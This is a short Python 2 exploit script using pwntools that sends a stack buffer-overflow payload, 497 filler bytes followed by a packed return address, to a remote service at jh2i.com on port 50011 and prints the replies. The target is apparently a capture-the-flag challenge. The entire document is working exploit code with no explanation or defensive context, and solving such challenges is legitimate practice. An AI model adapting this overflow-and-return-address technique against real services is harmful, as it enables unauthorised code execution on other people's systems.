from pwn import *

payload = 'A'*497+p64(0x0000000000401312)

p = remote('jh2i.com', 50011)
print p.recv()
p.sendline(payload)
print p.recvall()
